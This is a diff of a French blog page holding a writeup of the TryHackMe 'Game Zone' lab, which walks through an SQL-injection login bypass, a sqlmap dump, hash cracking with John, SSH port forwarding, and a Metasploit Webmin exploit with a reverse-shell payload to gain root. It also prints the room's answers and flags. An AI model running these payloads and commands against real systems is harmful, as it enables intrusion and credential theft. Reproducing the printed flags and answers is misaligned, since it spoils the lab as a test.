@@ -1,249 +1,257 @@
 <!DOCTYPE html>
 <html lang="fr">
-
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Game Zone — TryHackMe Writeup | Alex171</title>
-    <meta name="description"
-        content="Writeup Game Zone TryHackMe — SQLi, SQLmap, John, SSH tunnel, Metasploit Webmin RCE." />
-    <link rel="stylesheet" href="../css/style.css" />
-    <link rel="stylesheet" href="../css/animations.css" />
-    <link rel="icon"
-        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>" />
+  <meta charset="UTF-8"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Game Zone - TryHackMe Writeup | Alex171</title>
+  <meta name="description" content="Writeup exhaustif et complet"/>
+  <link rel="stylesheet" href="../css/style.css"/>
+  <link rel="stylesheet" href="../css/animations.css"/>
+  <link rel="icon" href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'><text y='.9em' font-size='90'>🔐</text></svg>"/>
+  <style>
+    /* Styling adjustments for exhaustive content */
+    .writeup-content img { max-width: 100%; border-radius: 8px; margin: 1.5rem 0; border: 1px solid var(--border); }
+    .writeup-content blockquote { border-left: 3px solid var(--green); padding-left: 1rem; color: var(--text-muted); margin: 1.5rem 0; font-style: italic; }
+    .writeup-content h1, .writeup-content h2, .writeup-content h3, .writeup-content h4 { color: var(--text-primary); margin-top: 2.5rem; margin-bottom: 1rem; }
+    .writeup-content p { margin-bottom: 1.5rem; line-height: 1.8; color: var(--text-secondary); }
+    .writeup-content ul, .writeup-content ol { margin-bottom: 1.5rem; padding-left: 2rem; }
+    .writeup-content li { margin-bottom: 0.5rem; }
+    .writeup-content code { background: rgba(0,255,65,0.1); padding: 0.2rem 0.4rem; border-radius: 4px; font-family: var(--font-mono); color: var(--green); font-size: 0.9em; }
+    .writeup-content pre code { background: transparent; padding: 0; color: inherit; }
+  </style>
 </head>
-
 <body>
-    <canvas id="matrix-canvas"></canvas>
-    <div class="grid-bg"></div>
-    <nav class="navbar">
-        <a class="nav-logo" href="../index.html">&gt;_<span> alex171</span></a>
-        <div class="nav-links">
-            <a href="../index.html">Accueil</a><a href="../about.html">À propos</a>
-            <a href="../writeups.html" class="active">Writeups</a><a href="../certifications.html">Certifications</a>
-            <a href="../projects.html">Projets</a><a href="../resources.html">Ressources</a>
+<canvas id="matrix-canvas"></canvas><div class="grid-bg"></div>
+<nav class="navbar">
+  <a class="nav-logo" href="../index">&gt;_<span> alex171</span></a>
+  <div class="nav-links">
+    <a href="../index">Accueil</a><a href="../about">À propos</a>
+    <a href="../writeups" class="active">Writeups</a><a href="../certifications">Certifications</a>
+    <a href="../projects">Projets</a><a href="../resources">Ressources</a>
+  </div>
+  <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
+</nav>
+<div class="mobile-menu" id="mobile-menu">
+  <a href="../index">Accueil</a><a href="../writeups">Writeups</a>
+  <a href="../certifications">Certifications</a><a href="../resources">Ressources</a>
+</div>
+
+<main>
+<section class="section">
+<div class="container">
+  <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;" class="fade-in">
+    <a href="../index" style="color:var(--text-muted);">~</a> / <a href="../writeups" style="color:var(--text-muted);">writeups</a> / <span style="color:var(--green);">game-zone</span>
+  </div>
+  <div class="writeup-layout">
+    <article class="writeup-content fade-in">
+      <div style="margin-bottom:2rem;">
+        <div style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
+          <span class="tag">SQLI</span><span class="tag blue">SQLmap</span><span class="tag purple">John</span><span class="tag">SSH</span><span class="tag blue">Metasploit</span><span class="tag purple">Privilege Escalation</span><span class="tag">Webmin</span>
         </div>
-        <div class="hamburger" id="hamburger"><span></span><span></span><span></span></div>
-    </nav>
-    <div class="mobile-menu" id="mobile-menu">
-        <a href="../index.html">Accueil</a><a href="../writeups.html">Writeups</a>
-        <a href="../certifications.html">Certifications</a><a href="../resources.html">Ressources</a>
-    </div>
+        <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">Game Zone - TryHackMe Writeup</h1>
+        <div style="font-family:var(--font-mono);font-size:0.85rem;color:var(--text-muted);margin-bottom:2rem;">
+            Publié le 2025-03-01 • TryHackMe
+        </div>
+      </div>
 
-    <main>
-        <section class="section">
-            <div class="container">
-                <!-- BREADCRUMB -->
-                <div style="font-family:var(--font-mono);font-size:0.78rem;color:var(--text-muted);margin-bottom:1.5rem;"
-                    class="fade-in">
-                    <a href="../index.html" style="color:var(--text-muted);">~</a> /
-                    <a href="../writeups.html" style="color:var(--text-muted);">writeups</a> /
-                    <span style="color:var(--green);">gamezone</span>
-                </div>
-
-                <div class="writeup-layout">
-                    <!-- CONTENT -->
-                    <article class="writeup-content fade-in">
-                        <!-- HEADER -->
-                        <div style="margin-bottom:2rem;">
-                            <div
-                                style="display:flex;align-items:center;gap:0.75rem;margin-bottom:0.75rem;flex-wrap:wrap;">
-                                <span class="writeup-platform">TryHackMe</span>
-                                <span class="diff diff-medium">Medium</span>
-                                <span style="font-family:var(--font-mono);font-size:0.72rem;color:var(--text-muted);">01
-                                    Mar 2026</span>
-                            </div>
-                            <h1 style="font-size:2rem;font-weight:800;color:var(--text-primary);margin-bottom:0.75rem;">
-                                Game Zone</h1>
-                            <div class="writeup-meta">
-                                <span class="tag">SQLi</span><span class="tag">SQLmap</span><span
-                                    class="tag">John</span>
-                                <span class="tag">SSH Tunnel</span><span class="tag">Metasploit</span><span
-                                    class="tag">Webmin</span>
-                            </div>
-                            <p style="color:var(--text-secondary);line-height:1.8;font-size:0.95rem;">
-                                Exploiter une vulnérabilité SQLi pour obtenir des mots de passe, les craquer avec John
-                                et obtenir
-                                un accès distant via SSH. Ensuite, exposition de services internes par tunnel SSH et
-                                escalade
-                                via Metasploit sur Webmin 1.580 vulnérable.
-                            </p>
-                        </div>
-
-                        <h2 id="objectif">Objectif</h2>
-                        <p>Compromettre la machine en exploitant une injection SQL, récupérer puis cracker un hash, puis
-                            faire une escalade de privilèges via une version vulnérable de Webmin.</p>
-
-                        <h2 id="task1">Task 1 — Deploy</h2>
-                        <p>Lancer la machine vulnérable pour obtenir une adresse IP, puis se rendre sur
-                            <code>http://machine_ip</code>.</p>
-
-                        <h2 id="task2">Task 2 — SQLi : Bypass Auth</h2>
-                        <p>La page d'accueil présente un formulaire de connexion. On peut se connecter sans mot de passe
-                            avec le payload suivant dans le champ username :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>sql</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-sql">' OR 1=1-- -</span></pre>
-                        </div>
-                        <p>L'application est vulnérable à une SQLi. On est redirigé vers <code>portal.php</code>.</p>
-
-                        <h2 id="task3">Task 3 — SQLmap</h2>
-                        <p>On intercepte la requête POST sur <code>portal.php</code> via Burp Suite et on la copie dans
-                            <code>request.txt</code> :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>request.txt</span><button
-                                    class="copy-btn">Copier</button></div>
-                            <pre><span class="hl-out">POST /portal.php HTTP/1.1
+      <h3 id="objectif">Objectif</h3>
+<p>Exploiter une vulnérabilité SQLi pour obtenir des mots de passe à craquer avec john et avoir un accès distant à la cible et utiliser metasploitable pour l’élevation de privilèges</p>
+<h3 id="task1-deploy-the-vulnerable-machine">Task1: Deploy the vulnerable machine</h3>
+<p>Lancer la machine vulnérable pour obtenir une adresse ip et ensuite se rendre sur la page d’acceuil via <code>http://machine_ip</code></p>
+<h3 id="task2-obtain-access-via-sqli">Task2: Obtain access via SQLi</h3>
+<p>La page d’acceuil présente un formulaire de connexion. On peut se connecter sans mot de passe avec le payload dans le champ username et un mot de passe aléatoire. </p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">sql</span><button class="copy-btn">Copier</button></div><pre><code class="language-sql">' OR 1=1-- -
+</code></pre></div>
+<p>L’application est donc vulnérable à une SQLi.On est redirigé vers la page portal.php</p>
+<p>Question: When you've logged in, what page do you get redirected to?</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>portal.php
+</code></pre></div>
+<h3 id="task3-using-sqlmap">Task3: Using SQLmap</h3>
+<p>L’objectif ici est de récupérer les données de la base de donnée. La page portal.php est une page de recherche. On teste dans le champ de recherche test et on intercepte la requête via BurpSuite qu’on copie dans un fichier request.txt</p>
+<p>Exemple de contenu de request.txt</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>POST /portal.php HTTP/1.1
 Host: lab.thm
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate, br
 Content-Type: application/x-www-form-urlencoded
-Cookie: PHPSESSID=...
+Content-Length: 15
+Origin: http://lab.thm
+Connection: keep-alive
+Referer: http://lab.thm/portal.php
+Cookie: PHPSESSID=o3bsihnklko2ak2fi6oretqms3
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i
 
-searchitem=test</span></pre>
-                        </div>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">sqlmap</span> -r request.txt --dbms=mysql --dump</pre>
-                        </div>
-                        <p>On récupère depuis la table <code>users</code> :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>output</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-out">username : agent47
-hash     : ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14</span></pre>
-                        </div>
+searchitem=test
+</code></pre></div>
+<p>On peut donc passez ce fichier à sqlmap</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">sqlmap -r request.txt --dbms=mysql --dump</span>
+</code></pre></div>
+<p><img alt="image.png" src="attachment:6163d572-46ac-4544-ae58-c96f2e03e1f4:image.png"/></p>
+<ol>
+<li>In the users table, what is the hashed password? </li>
+</ol>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14
+</code></pre></div>
+<ol>
+<li>What was the username associated with the hashed password?</li>
+</ol>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>agent47
+</code></pre></div>
+<ol>
+<li>What was the username associated with the hashed password?</li>
+</ol>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>post
+</code></pre></div>
+<h3 id="task4-cracking-a-password-with-john-the-ripper">Task4: Cracking a password with John The Ripper</h3>
+<p>L’objectif est de cracker le hash de agent47 obtenu via John the Ripper. Après avoir copié le mot de passe dans hash.txt on exécute pour détecter la version du hash </p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+</code></pre></div>
+<p>On obtient</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>Warning: detected hash type "cryptoSafe", but the string is also recognized as "Raw-SHA256"
 
-                        <h2 id="task4">Task 4 — John The Ripper</h2>
-                        <p>On copie le hash dans <code>hash.txt</code> et on détecte le format SHA-256 :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">john</span> --format=Raw-SHA256 \
-  --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</pre>
-                        </div>
-                        <div class="flag-box">Mot de passe cracké : <strong>videogamer124</strong></div>
-                        <p>On se connecte en SSH :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">ssh</span> agent47@lab.thm</pre>
-                        </div>
-                        <div class="flag-box">User flag : <code>649ac17b1480ac13ef1e4fa579dac95c</code></div>
+</code></pre></div>
+<p>On peut donc cracher le hash avec le format <code>Raw-SHA256</code></p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">john --format=Raw-SHA256 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt</span>
+</code></pre></div>
+<p>Ainsi ,</p>
+<ol>
+<li>What is the de-hashed password?</li>
+</ol>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>videogamer124
+</code></pre></div>
+<ol>
+<li>Now you have a password and username. Try SSH'ing onto the machine. What is the user flag?</li>
+</ol>
+<p>Il faut se connecter via ssh </p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ssh agent47@lab.thm</span>
+</code></pre></div>
+<p><img alt="image.png" src="attachment:cb8d7108-2615-48b4-b077-87c9d443d914:image.png"/></p>
+<p>Le flag est donc</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>649ac17b1480ac13ef1e4fa579dac95c
+</code></pre></div>
+<h3 id="task5-exposing-services-with-reverse-ssh-tunnels">Task5: Exposing services with reverse SSH tunnels</h3>
+<ol>
+<li>How many TCP sockets are running?</li>
+</ol>
+<p><img alt="image.png" src="attachment:5b2cb01f-7b25-4652-9fd3-22c5956a0043:image.png"/></p>
+<p>La réponse est donc: </p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>5
+</code></pre></div>
+<ol>
+<li>What is the name of the exposed CMS?</li>
+</ol>
+<p>On se connecte via </p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ssh -L 10000:localhost:10000 agent47@lab.thm</span>
+</code></pre></div>
+<p>Ensuite dan notre navigateur on se rend sur  <a href="http://localhost:10000/"><code>http://localhost:10000/</code></a></p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>http://localhost:10000/
+</code></pre></div>
+<p>A la page de connexion on se connecte via </p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>username : agent47
+password: videogamer124
+</code></pre></div>
+<p>La réponse est donc:</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>Webmin
+</code></pre></div>
+<ol>
+<li>What is the CMS version?</li>
+</ol>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>1.580
+</code></pre></div>
+<h3 id="task6-privilege-escalation-with-metasploit">Task6 : Privilege Escalation with Metasploit</h3>
+<p>L’objectif est d’utiliser metasploitable pour obtenir un accès root en exploitation la version vulnérable de webmin</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="hl-comment"># msfconsole</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf &gt; search -name=webmin 1.580</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf &gt; use 0</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set password videogamer124</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set payload cmd/unix/reverse</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set username agent47</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set lhost 192.168.148.105</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set rhosts 127.0.0.1</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; set ssl fal</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">msf exploit(unix/webapp/webmin_show_cgi_exec) &gt; run</span>
+</code></pre></div>
+<p>Le payload choisis est <code>cmd/unix/reverse</code> car la cible est un système unix(Linux) et le tunnel <code>10000:localhost:10000</code> est en raison de l’incapacité d’accéder au service via l’extérieur.</p>
+<p>On obtient un accès root à la machine donc on stabilise le shell et on récupère le flag</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">bash</span><button class="copy-btn">Copier</button></div><pre><code class="language-bash"><span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">python3 --version</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">Python 3.5.2</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">python3 -c 'import pty; pty.spawn("/bin/bash")'</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@gamezone:/usr/share/webmin/file/# ls /root</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">ls /root</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@gamezone:/usr/share/webmin/file/# cat /root/root.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">cat /root/root.txt</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">a4b945830144bdd71908d12d902adeee</span>
+<span class="t-prompt" style="color:var(--green)">$</span> <span class="hl-bash">root@gamezone:/usr/share/webmin/file/# </span>
+</code></pre></div>
+<p>Le flag est donc</p>
+<div class="code-block"><div class="code-block-header"><div class="code-dots"><span class="code-dot" style="background:#ff5f56"></span><span class="code-dot" style="background:#ffbd2e"></span><span class="code-dot" style="background:#27c93f"></span></div><span class="code-title">console</span><button class="copy-btn">Copier</button></div><pre><code>a4b945830144bdd71908d12d902adeee
+</code></pre></div>
+<h3 id="lecons-apprises">Leçons apprises</h3>
+<ul>
+<li>Détecter manuellement les SQLi et automatiser le dump via SQLmap</li>
+<li>Faire du port forwading via ssh</li>
+</ul>
+<h3 id="ressources">Ressources</h3>
+<ul>
+<li>https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection</li>
+<li>https://tryhackme.com/room/gamezone/</li>
+</ul>
 
-                        <h2 id="task5">Task 5 — Tunnel SSH</h2>
-                        <p>On détecte 5 sockets TCP ouverts. Le port 10000 tourne en interne (Webmin). On crée un tunnel
-                            SSH :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre><span class="hl-bash">ssh</span> -L 10000:localhost:10000 agent47@lab.thm</pre>
-                        </div>
-                        <p>On accède à <code>http://localhost:10000</code> — CMS <strong>Webmin 1.580</strong> détecté.
-                        </p>
+      <div style="margin-top:3rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
+        <a href="../writeups" class="btn btn-outline">← Tous les writeups</a>
+      </div>
+    </article>
 
-                        <h2 id="task6">Task 6 — Privilege Escalation (Metasploit)</h2>
-                        <p>Webmin 1.580 est vulnérable à une RCE authentifiée. On exploite via Metasploit :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash — msfconsole</span><button
-                                    class="copy-btn">Copier</button></div>
-                            <pre><span class="hl-bash">msf</span> &gt; search webmin 1.580
-<span class="hl-bash">msf</span> &gt; use unix/webapp/webmin_show_cgi_exec
-<span class="hl-bash">msf</span> &gt; set username agent47
-<span class="hl-bash">msf</span> &gt; set password videogamer124
-<span class="hl-bash">msf</span> &gt; set payload cmd/unix/reverse
-<span class="hl-bash">msf</span> &gt; set rhosts 127.0.0.1
-<span class="hl-bash">msf</span> &gt; set lhost &lt;votre_ip&gt;
-<span class="hl-bash">msf</span> &gt; set ssl false
-<span class="hl-bash">msf</span> &gt; run</pre>
-                        </div>
-                        <p>On obtient un shell root. On stabilise et récupère le flag :</p>
-                        <div class="code-block">
-                            <div class="code-block-header"><span>bash</span><button class="copy-btn">Copier</button>
-                            </div>
-                            <pre>python3 -c <span class="hl-out">'import pty; pty.spawn("/bin/bash")'</span>
-<span class="hl-bash">cat</span> /root/root.txt</pre>
-                        </div>
-                        <div class="flag-box">Root flag : <code>a4b945830144bdd71908d12d902adeee</code></div>
+    <aside class="writeup-sidebar" style="position: sticky; top: 100px;">
+      <div class="sidebar-title">Table des matières</div>
+      <div class="toc-list" style="max-height: calc(100vh - 150px); overflow-y: auto;">
+        <a href="#objectif" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Objectif</a>
+<a href="#task1-deploy-the-vulnerable-machine" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Task1: Deploy the vulnerable machine</a>
+<a href="#task2-obtain-access-via-sqli" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Task2: Obtain access via SQLi</a>
+<a href="#task3-using-sqlmap" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Task3: Using SQLmap</a>
+<a href="#task4-cracking-a-password-with-john-the-ripper" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Task4: Cracking a password with John The Ripper</a>
+<a href="#task5-exposing-services-with-reverse-ssh-tunnels" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Task5: Exposing services with reverse SSH tunnels</a>
+<a href="#task6-privilege-escalation-with-metasploit" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Task6 : Privilege Escalation with Metasploit</a>
+<a href="#lecons-apprises" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Leçons apprises</a>
+<a href="#ressources" class="toc-item" style="display:block; text-decoration:none; padding:4px 0; ">Ressources</a>
 
-                        <h2 id="lessons">Leçons apprises</h2>
-                        <ul>
-                            <li>Détecter manuellement les SQLi (bypass auth) et automatiser avec SQLmap</li>
-                            <li>Port forwarding SSH pour exposer des services internes</li>
-                            <li>Ne jamais laisser tourner des CMS vulnérables (Webmin) sans MAJ</li>
-                        </ul>
+      </div>
+      <hr style="border-color:var(--border);margin:1.5rem 0;"/>
+      <div style="display:flex;flex-direction:column;gap:0.6rem;font-size:0.85rem;font-family:var(--font-mono);">
+        <div><span style="color:var(--text-muted);">Plateforme :</span> <span style="color:var(--green);">TryHackMe</span></div>
+        <div><span style="color:var(--text-muted);">Difficulté :</span> <span><span class="diff diff-medium">Medium</span></span></div>
+        <div><span style="color:var(--text-muted);">Date :</span> <span style="color:var(--text-secondary);">2025-03-01</span></div>
+      </div>
+    </aside>
+  </div>
+</div>
+</section>
+</main>
 
-                        <div
-                            style="margin-top:2rem;padding-top:1.5rem;border-top:1px solid var(--border);display:flex;gap:1rem;flex-wrap:wrap;">
-                            <a href="../writeups.html" class="btn btn-outline">← Retour aux writeups</a>
-                            <a href="easy-ctf.html" class="btn btn-outline">Suivant : Easy CTF →</a>
-                        </div>
-                    </article>
+<footer><div class="container"><div class="footer-inner">
+  <div class="footer-name">&gt;_ alex171-studo</div>
+  <div class="footer-links"><a href="../writeups">Writeups</a><a href="../index">Accueil</a></div>
+  <div class="footer-copy">© 2026 Alex171-studo</div>
+</div></div></footer>
 
-                    <!-- SIDEBAR -->
-                    <aside class="writeup-sidebar">
-                        <div class="sidebar-title">Table des matières</div>
-                        <div class="toc-list">
-                            <div class="toc-item" data-target="objectif">Objectif</div>
-                            <div class="toc-item" data-target="task1">Task 1 — Deploy</div>
-                            <div class="toc-item" data-target="task2">Task 2 — SQLi Bypass</div>
-                            <div class="toc-item" data-target="task3">Task 3 — SQLmap</div>
-                            <div class="toc-item" data-target="task4">Task 4 — John</div>
-                            <div class="toc-item" data-target="task5">Task 5 — SSH Tunnel</div>
-                            <div class="toc-item" data-target="task6">Task 6 — Privesc</div>
-                            <div class="toc-item" data-target="lessons">Leçons apprises</div>
-                        </div>
-                        <hr style="border-color:var(--border);margin:1rem 0;" />
-                        <div class="sidebar-title">Infos</div>
-                        <div
-                            style="display:flex;flex-direction:column;gap:0.4rem;font-size:0.78rem;font-family:var(--font-mono);">
-                            <div><span style="color:var(--text-muted);">Plateforme :</span> <span
-                                    style="color:var(--green);">TryHackMe</span></div>
-                            <div><span style="color:var(--text-muted);">Difficulté :</span> <span
-                                    style="color:#fbbf24;">Medium</span></div>
-                            <div><span style="color:var(--text-muted);">Date :</span> <span
-                                    style="color:var(--text-secondary);">01 Mar 2026</span></div>
-                            <div style="margin-top:0.5rem;"><a href="https://tryhackme.com/room/gamezone"
-                                    target="_blank" class="btn btn-outline"
-                                    style="font-size:0.75rem;padding:0.4rem 0.75rem;width:100%;justify-content:center;">→
-                                    Room THM</a></div>
-                        </div>
-                    </aside>
-                </div>
-            </div>
-        </section>
-    </main>
-
-    <footer>
-        <div class="container">
-            <div class="footer-inner">
-                <div class="footer-name">&gt;_ alex171-studo</div>
-                <div class="footer-links"><a href="../writeups.html">Writeups</a><a href="../index.html">Accueil</a>
-                </div>
-                <div class="footer-copy">© 2026 Alex171-studo</div>
-            </div>
-        </div>
-    </footer>
-
-    <div id="interactive-terminal" class="terminal-window">
-        <div class="terminal-titlebar">
-            <div class="terminal-dot dot-red"></div>
-            <div class="terminal-dot dot-yellow"></div>
-            <div class="terminal-dot dot-green"></div>
-            <span class="terminal-title">Terminal interactif</span>
-            <button id="term-close"
-                style="background:none;border:none;color:var(--text-muted);cursor:pointer;margin-left:auto;">✕</button>
-        </div>
-        <div class="term-interactive-body" id="term-output"></div>
-        <div class="term-input-line">
